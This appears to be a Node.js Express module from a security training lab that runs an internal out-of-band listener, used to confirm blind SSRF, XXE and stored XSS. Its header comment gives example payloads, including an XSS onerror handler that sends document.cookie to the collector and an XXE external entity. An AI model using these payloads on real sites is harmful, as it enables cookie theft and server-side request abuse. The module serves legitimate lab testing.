'use strict';

const express = require('express');
const router = express.Router();

// ---------------------------------------------------------------------------
// Internal out-of-band (OOB) collaborator — LAB INSTRUMENTATION, not a vuln.
//
// Blind vulnerability classes (blind SSRF, blind XXE, blind stored XSS) have no
// in-band signal: the response the attacker sees is identical whether or not the
// payload fired. To VERIFY them you need an out-of-band listener that the target
// contacts when the payload executes.
//
// This module is a Burp-Collaborator / interactsh-style listener that lives
// inside the lab itself, so a scanner (e.g. Vex Raptor) or the coverage script
// can confirm blind classes without any external infrastructure:
//
//   1. Mint a token:            GET  /api/oob/token           -> { token, url }
//   2. Point a blind payload at the token URL, e.g.
//        SSRF:  POST /api/webhooks/test { "url": "http://<host>/oob/<token>" }
//        XXE :  <!ENTITY x SYSTEM "http://<host>/oob/<token>">
//        XSS :  <img src=x onerror="fetch('/oob/<token>?c='+document.cookie)">
//   3. Poll for the hit:        GET  /api/oob/hits/<token>    -> { hits: [...] }
//
// Each hit records time, source IP, method, full path (query string included,
// so exfiltrated cookies land in `c=`), and User-Agent.
// ---------------------------------------------------------------------------

const crypto = require('crypto');
const hits = new Map(); // token -> [{ at, ip, method, url, ua, query }]

function mint() {
  return 'oob_' + crypto.randomBytes(8).toString('hex');
}

// Record a hit for a token (used by the top-level /oob/:token collector).
function record(token, req) {
  if (!hits.has(token)) hits.set(token, []);
  const arr = hits.get(token);
  arr.push({
    at: new Date().toISOString(),
    ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString(),
    method: req.method,
    url: req.originalUrl,
    ua: (req.headers['user-agent'] || '').toString(),
    query: req.query || {}
  });
  if (arr.length > 200) arr.shift();
}

// The collector endpoint, mounted at top level as /oob/:token so payload URLs
// stay short and look like a tracking pixel. Always answers 200 with a 1x1 gif.
const PIXEL = Buffer.from('R0lGODlhAQABAAAAACwAAAAAAQABAAA=', 'base64');
function collector(req, res) {
  const token = req.params.token;
  if (token) record(token, req);
  res.setHeader('Content-Type', 'image/gif');
  res.end(PIXEL);
}

// Mint a fresh token + its absolute collector URL (host-aware for remote labs).
router.get('/token', (req, res) => {
  const token = mint();
  hits.set(token, []);
  const host = req.headers['x-forwarded-host'] || req.headers.host || `localhost:${process.env.PORT || 3000}`;
  const proto = req.headers['x-forwarded-proto'] || 'http';
  res.json({ token, url: `${proto}://${host}/oob/${token}` });
});

// Poll the hits recorded for a token. `count` makes it trivial for a scanner to
// assert "at least one correlated inbound request => blind class verified".
router.get('/hits/:token', (req, res) => {
  const arr = hits.get(req.params.token) || [];
  res.json({ token: req.params.token, count: arr.length, hits: arr });
});

module.exports = { router, collector };
